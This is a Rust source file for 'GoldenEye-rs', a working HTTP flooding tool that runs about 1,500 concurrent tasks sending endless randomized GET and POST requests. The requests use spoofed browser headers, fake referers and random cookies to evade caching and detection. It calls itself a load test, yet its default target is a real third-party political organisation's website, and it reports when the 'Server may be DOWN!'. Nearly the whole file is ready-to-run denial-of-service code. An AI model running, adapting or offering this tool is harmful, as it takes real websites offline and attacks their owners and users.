use clap::Parser;
use rand::prelude::*;
use rand::{Rng, SeedableRng};
use rand_chacha::ChaCha8Rng; // or ChaCha20Rng/StdRng
use reqwest::header::{
    HeaderMap, HeaderName, HeaderValue, ACCEPT, ACCEPT_ENCODING, ACCEPT_LANGUAGE, CONNECTION,
    CONTENT_TYPE, HOST, REFERER, USER_AGENT,
};
use reqwest::{Client, Proxy};
use std::io::{BufRead, BufReader};
use std::sync::{
    atomic::{AtomicBool, AtomicUsize, Ordering},
    Arc,
};
use std::time::Duration;
use tokio::signal;
use tokio::task::JoinHandle;
use tokio::time::sleep;

// Enable multipart support (requires adding the "multipart" feature in Cargo.toml)
use reqwest::multipart;

const DEFAULT_WORKERS: usize = 300;
const DEFAULT_SOCKETS: usize = 5;

const METHOD_GET: &str = "get";
const METHOD_POST: &str = "post";
const METHOD_RAND: &str = "random";
const DEFAULT_WEBSITE: &str = "https://www.project2025.org/";

#[derive(Parser, Debug)]
#[command(author, version, about)]
struct Cli {
    /// Target URL (http://... or https://...)
    #[arg(default_value_t = DEFAULT_WEBSITE.to_string())]
    url: String,

    /// Number of worker “groups”
    #[arg(short = 'w', long = "workers", default_value_t = DEFAULT_WORKERS)]
    workers: usize,

    /// Number of concurrent sockets per worker
    #[arg(short = 's', long = "sockets", default_value_t = DEFAULT_SOCKETS)]
    sockets: usize,

    /// HTTP method to use: get, post, or random
    #[arg(short = 'm', long = "method", default_value_t = String::from(METHOD_RAND))]
    method: String,

    /// Path to file containing a list of user agent strings
    #[arg(short = 'u', long = "useragents")]
    useragents: Option<String>,

    /// Skip SSL certificate verification
    #[arg(short = 'n', long = "nosslcheck", default_value_t = false)]
    nosslcheck: bool,

    /// Print debug info
    #[arg(short = 'd', long = "debug", default_value_t = false)]
    debug: bool,
}

/// Manages random data generation: strings, query params, user agents, etc.
struct RandomDataGenerator {
    user_agents: Arc<Vec<String>>,
    rng: ChaCha8Rng,
}

impl RandomDataGenerator {
    fn new(user_agents: Arc<Vec<String>>) -> Self {
        // Seed with random data from the OS
        let seed: [u8; 32] = rand::random();
        let rng = ChaCha8Rng::from_seed(seed);
        Self { user_agents, rng }
    }

    /// Build a random ASCII string of length `size`.
    fn build_block(&mut self, size: usize) -> String {
        const CHARSET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ\
                                 abcdefghijklmnopqrstuvwxyz\
                                 0123456789";
        let mut output = String::with_capacity(size);
        for _ in 0..size {
            let idx = self.rng.gen_range(0..CHARSET.len());
            output.push(CHARSET[idx] as char);
        }
        output
    }

    /// Generate a small random user agent if none are provided.
    fn random_user_agent(&mut self) -> String {
        let os_opts = [
            "Windows NT 10.0; Win64; x64",
            "Macintosh; Intel Mac OS X 10_15_7",
            "X11; Linux x86_64",
        ];
        let br_opts = [
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.77 Safari/537.36",
            "Gecko/20100101 Firefox/109.0",
        ];
        let os_ua = os_opts[self.rng.gen_range(0..os_opts.len())];
        let br_ua = br_opts[self.rng.gen_range(0..br_opts.len())];
        format!("Mozilla/5.0 ({}) {}", os_ua, br_ua)
    }

    /// Return a user agent from the pool or randomly generate it.
    fn get_user_agent(&mut self) -> String {
        if !self.user_agents.is_empty() {
            let idx = self.rng.gen_range(0..self.user_agents.len());
            self.user_agents[idx].clone()
        } else {
            self.random_user_agent()
        }
    }

    /// Generate a query string with random keys/values.
    fn generate_query_string(&mut self, pairs: usize) -> String {
        let mut output = String::new();
        for i in 0..pairs {
            let key_size = self.rng.gen_range(3..11);
            let val_size = self.rng.gen_range(3..21);
            let key = self.build_block(key_size);
            let val = self.build_block(val_size);
            output.push_str(&key);
            output.push('=');
            output.push_str(&val);
            if i < pairs - 1 {
                output.push('&');
            }
        }
        output
    }
}

/// Chooses a realistic path – sometimes using a common endpoint.
fn random_path(data_gen: &mut RandomDataGenerator, base_path: &str) -> String {
    let common_paths = [
        "/", "/index.html", "/home", "/login", "/dashboard", "/api/data", "/products", "/contact", "/about",
    ];
    if data_gen.rng.gen_bool(0.3) {
        let idx = data_gen.rng.gen_range(0..common_paths.len());
        common_paths[idx].to_string()
    } else if base_path.is_empty() {
        "/".to_string()
    } else {
        base_path.to_string()
    }
}

/// Randomly build a “Cookie” header value.
fn build_cookie_header(data_gen: &mut RandomDataGenerator) -> Option<HeaderValue> {
    if data_gen.rng.gen_bool(0.5) {
        let num_cookies = data_gen.rng.gen_range(1..5);
        let mut cookies = Vec::new();
        for _ in 0..num_cookies {
            let name_len = data_gen.rng.gen_range(3..10);
            let name = data_gen.build_block(name_len);
            let value_len = data_gen.rng.gen_range(5..15);
            let value = data_gen.build_block(value_len);
            cookies.push(format!("{}={}", name, value));
        }
        let cookie_str = cookies.join("; ");
        if let Ok(hv) = HeaderValue::from_str(&cookie_str) {
            return Some(hv);
        }
    }
    None
}

/// Build random headers for each request, trying to look more like a real browser.
/// The `is_post` flag lets us add (or omit) headers like Content-Type.
fn build_headers(data_gen: &mut RandomDataGenerator, host: &str, is_post: bool) -> HeaderMap {
    let mut headers = HeaderMap::new();

    // 1) Standard “browser-like” headers:
    headers.insert(
        ACCEPT,
        HeaderValue::from_static("text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"),
    );
    headers.insert(
        ACCEPT_LANGUAGE,
        HeaderValue::from_static("en-US,en;q=0.9"),
    );
    // Randomize Accept-Encoding
    let enc_opts = ["gzip", "deflate", "br", "identity"];
    let mut shuffle_enc = enc_opts.to_vec();
    shuffle_enc.shuffle(&mut data_gen.rng);
    let ecount = data_gen.rng.gen_range(1..=shuffle_enc.len());
    let chosen_enc = &shuffle_enc[0..ecount];
    let accept_encoding = chosen_enc.join(", ");
    if let Ok(hv) = HeaderValue::from_str(&accept_encoding) {
        headers.insert(ACCEPT_ENCODING, hv);
    }

    // 2) Sec-Fetch-* headers:
    headers.insert(
        HeaderName::from_static("sec-fetch-site"),
        HeaderValue::from_static("none"),
    );
    headers.insert(
        HeaderName::from_static("sec-fetch-mode"),
        HeaderValue::from_static("navigate"),
    );
    headers.insert(
        HeaderName::from_static("sec-fetch-user"),
        HeaderValue::from_static("?1"),
    );
    headers.insert(
        HeaderName::from_static("sec-fetch-dest"),
        HeaderValue::from_static("document"),
    );

    // 3) Upgrade-Insecure-Requests:
    headers.insert(
        HeaderName::from_static("upgrade-insecure-requests"),
        HeaderValue::from_static("1"),
    );

    // 4) Sec-CH-UA headers:
    if let Ok(hv) = HeaderValue::from_str("\"Chromium\";v=\"110\", \"Not A(Brand\";v=\"99\"") {
        headers.insert(HeaderName::from_static("sec-ch-ua"), hv);
    }
    if let Ok(hv) = HeaderValue::from_str("?0") {
        headers.insert(HeaderName::from_static("sec-ch-ua-mobile"), hv);
    }

    // 5) User-Agent:
    let user_agent = data_gen.get_user_agent();
    if let Ok(hv) = HeaderValue::from_str(&user_agent) {
        headers.insert(USER_AGENT, hv);
    } else {
        headers.insert(USER_AGENT, HeaderValue::from_static("Mozilla/5.0"));
    }

    // 6) Host and Connection:
    if let Ok(hv) = HeaderValue::from_str(host) {
        headers.insert(HOST, hv);
    } else {
        headers.insert(HOST, HeaderValue::from_static("invalid.host"));
    }
    headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));

    // 7) Optional Referer:
    if data_gen.rng.gen_bool(0.5) {
        let ref_opts = [
            "https://www.google.com/",
            "https://www.bing.com/",
            "https://www.baidu.com/",
            "https://www.yandex.com/",
            &format!("https://{}/", host),
        ];
        let idx = data_gen.rng.gen_range(0..ref_opts.len());
        let mut referer = ref_opts[idx].to_string();
        if data_gen.rng.gen_bool(0.5) {
            let pairs = data_gen.rng.gen_range(1..6);
            let q = data_gen.generate_query_string(pairs);
            referer.push('?');
            referer.push_str(&q);
        }
        if let Ok(hv) = HeaderValue::from_str(&referer) {
            headers.insert(REFERER, hv);
        }
    }

    // 8) For POST requests, optionally add Content-Type and Cookies.
    if is_post {
        let use_multipart = data_gen.rng.gen_bool(0.5);
        if !use_multipart {
            headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/x-www-form-urlencoded"));
        }
        if let Some(cookie) = build_cookie_header(data_gen) {
            headers.insert("cookie", cookie);
        }
    } else if data_gen.rng.gen_bool(0.3) {
        if let Some(cookie) = build_cookie_header(data_gen) {
            headers.insert("cookie", cookie);
        }
    }

    // 9) Cache-Control:
    let cache_opts = ["no-cache", "max-age=0"];
    let cc_idx = data_gen.rng.gen_range(0..cache_opts.len());
    if let Ok(hv) = HeaderValue::from_str(cache_opts[cc_idx]) {
        headers.insert(HeaderName::from_static("cache-control"), hv);
    }

    // 10) Global Privacy Control:
    headers.insert(
        HeaderName::from_static("sec-gpc"),
        HeaderValue::from_static("1"),
    );

    // 11) Optionally add DNT:
    if data_gen.rng.gen_bool(0.5) {
        headers.insert("dnt", HeaderValue::from_static("1"));
    }

    headers
}

/// Shared state for the load test.
struct LoadTestState {
    success_count: AtomicUsize,
    fail_count: AtomicUsize,
    running: AtomicBool,
}

impl LoadTestState {
    fn new() -> Self {
        Self {
            success_count: AtomicUsize::new(0),
            fail_count: AtomicUsize::new(0),
            running: AtomicBool::new(true),
        }
    }

    fn inc_success(&self) {
        self.success_count.fetch_add(1, Ordering::Relaxed);
    }

    fn inc_fail(&self) {
        self.fail_count.fetch_add(1, Ordering::Relaxed);
    }

    fn stop(&self) {
        self.running.store(false, Ordering::SeqCst);
    }

    fn is_running(&self) -> bool {
        self.running.load(Ordering::SeqCst)
    }
}

/// Each socket task continuously sends requests.
async fn socket_task(
    client: reqwest::Client,
    url: String,
    method: String,
    state: Arc<LoadTestState>,
    mut data_gen: RandomDataGenerator,
    debug: bool,
) {
    // Parse URL details.
    let parsed = match reqwest::Url::parse(&url) {
        Ok(p) => p,
        Err(e) => {
            eprintln!("[!] Invalid URL {url}: {e}");
            return;
        }
    };

    let port = parsed.port_or_known_default().unwrap_or_else(|| {
        if parsed.scheme() == "https" { 443 } else { 80 }
    });
    let host = parsed.host_str().unwrap_or("localhost").to_string();
    let scheme = parsed.scheme();

    // Loop indefinitely until state signals to stop.
    while state.is_running() {
        let chosen_method = if method == METHOD_RAND {
            if data_gen.rng.gen_bool(0.5) {
                METHOD_GET
            } else {
                METHOD_POST
            }
        } else {
            method.as_str()
        };
        let is_post = chosen_method == METHOD_POST;
        let base_path = parsed.path().trim();
        let final_path = random_path(&mut data_gen, if base_path.is_empty() { "/" } else { base_path });
        let headers = build_headers(&mut data_gen, &host, is_post);

        if chosen_method == METHOD_GET {
            // Build GET URL with random query parameters.
            let pairs_count = data_gen.rng.gen_range(1..6);
            let q_string = data_gen.generate_query_string(pairs_count);
            let joiner = if final_path.contains('?') { '&' } else { '?' };
            let req_url = format!(
                "{}://{}:{}{}{}{}",
                scheme, host, port, final_path, joiner, q_string
            );
            let req_builder = client.get(&req_url).headers(headers);
            match req_builder.send().await {
                Ok(response) => {
                    let _ = response.bytes().await;
                    state.inc_success();
                }
                Err(e) => {
                    if debug {
                        eprintln!("[DEBUG] GET error: {e}");
                    }
                    state.inc_fail();
                }
            }
        } else {
            // POST request without query parameters in the URL.
            let req_url = format!("{}://{}:{}{}", scheme, host, port, final_path);
            let req_builder = client.post(&req_url).headers(headers);
            if data_gen.rng.gen_bool(0.5) {
                // Multipart/form-data POST.
                let num_fields = data_gen.rng.gen_range(1..6);
                let mut form = multipart::Form::new();
                for _ in 0..num_fields {
                    let name_len = data_gen.rng.gen_range(3..10);
                    let field_name = data_gen.build_block(name_len);
                    let value_len = data_gen.rng.gen_range(5..15);
                    let field_value = data_gen.build_block(value_len);
                    form = form.text(field_name, field_value);
                }
                match req_builder.multipart(form).send().await {
                    Ok(response) => {
                        let _ = response.bytes().await;
                        state.inc_success();
                    }
                    Err(e) => {
                        if debug {
                            eprintln!("[DEBUG] Multipart POST error: {e}");
                        }
                        state.inc_fail();
                    }
                }
            } else {
                // URL-encoded POST.
                let num_pairs = data_gen.rng.gen_range(1..6);
                let body = data_gen.generate_query_string(num_pairs);
                match req_builder.body(body).send().await {
                    Ok(response) => {
                        let _ = response.bytes().await;
                        state.inc_success();
                    }
                    Err(e) => {
                        if debug {
                            eprintln!("[DEBUG] POST error: {e}");
                        }
                        state.inc_fail();
                    }
                }
            }
        }
    }
}

/// Monitor task prints out status every few seconds and stops on Ctrl+C.
async fn monitor_state(state: Arc<LoadTestState>, debug: bool) {
    let mut last_success = 0;
    let mut last_fail = 0;
    let mut avg = 0.0;

    loop {
        tokio::select! {
            _ = signal::ctrl_c() => {
                eprintln!("\n[!] Caught Ctrl+C, stopping...");
                state.stop();
                break;
            }
            _ = sleep(Duration::from_secs(3)) => {
                let s = state.success_count.load(Ordering::Relaxed);
                let f = state.fail_count.load(Ordering::Relaxed);
                avg = if avg == 0.0 { s as f64 } else { ((avg + s as f64) / 2.0).floor() };

                print!("[+] Hits: {s} | Fails: {f}, Avg: {avg}");
                // Reset counter for next interval.
                state.success_count.store(0, Ordering::Relaxed);

                if s > 0 && f > 0 && s == last_success && f > last_fail {
                    print!(" => Server may be DOWN!");
                }
                println!();
                last_success = s;
                last_fail = f;
            }
        }
        if !state.is_running() {
            break;
        }
    }

    let final_s = state.success_count.load(Ordering::Relaxed);
    let final_f = state.fail_count.load(Ordering::Relaxed);
    println!("[+] Final Hits: {final_s} | Final Fails: {final_f}");
    if debug {
        println!("[DEBUG] Monitor finished.");
    }
}

#[tokio::main]
async fn main() {
    let cli = Cli::parse();

    println!("\nGoldenEye-rs - Maximized Throughput Mode");
    println!("-----------------------------------------");
    println!("Target: {}", cli.url);
    println!(
        "Mode: '{}' | Workers: {} | Sockets/Worker: {}",
        cli.method, cli.workers, cli.sockets
    );
    println!("Press Ctrl+C to stop.\n");

    // Load user agents if provided.
    let mut user_agents_vec = Vec::new();
    if let Some(path) = &cli.useragents {
        if let Ok(file) = std::fs::File::open(path) {
            let reader = BufReader::new(file);
            for line in reader.lines().flatten() {
                let trimmed = line.trim().to_string();
                if !trimmed.is_empty() {
                    user_agents_vec.push(trimmed);
                }
            }
        } else {
            eprintln!("[!] Could not read useragents file.");
        }
    }
    let user_agents_arc = Arc::new(user_agents_vec);

    // Global state.
    let state = Arc::new(LoadTestState::new());
    let mut tasks: Vec<JoinHandle<()>> = Vec::new();

    // Tune the reqwest client for high concurrency.
    let mut client_builder = reqwest::Client::builder()
        .tcp_keepalive(Some(Duration::from_secs(90)))
        .pool_idle_timeout(Duration::from_secs(90))
        .pool_max_idle_per_host(1000);
    if cli.nosslcheck {
        client_builder = client_builder.danger_accept_invalid_certs(true);
    }
    let client = match client_builder.build() {
        Ok(c) => c,
        Err(e) => {
            eprintln!("[!] Failed to build reqwest client: {e}");
            return;
        }
    };

    // Instead of "workers" with an inner sockets loop, spawn one task per socket.
    let total_tasks = cli.workers * cli.sockets;
    for _ in 0..total_tasks {
        let task_client = client.clone();
        let task_state = Arc::clone(&state);
        let task_url = cli.url.clone();
        let task_method = cli.method.clone();
        let task_debug = cli.debug;
        let task_data_gen = RandomDataGenerator::new(Arc::clone(&user_agents_arc));
        tasks.push(tokio::spawn(socket_task(
            task_client,
            task_url,
            task_method,
            task_state,
            task_data_gen,
            task_debug,
        )));
    }

    // Spawn the monitor task.
    let monitor_handle = {
        let st = Arc::clone(&state);
        let dbg = cli.debug;
        tokio::spawn(async move { monitor_state(st, dbg).await })
    };

    // Wait for all tasks (they will only stop after Ctrl+C).
    for t in tasks {
        let _ = t.await;
    }
    let _ = monitor_handle.await;

    println!("\n[+] Exiting GoldenEye-rs.");
}
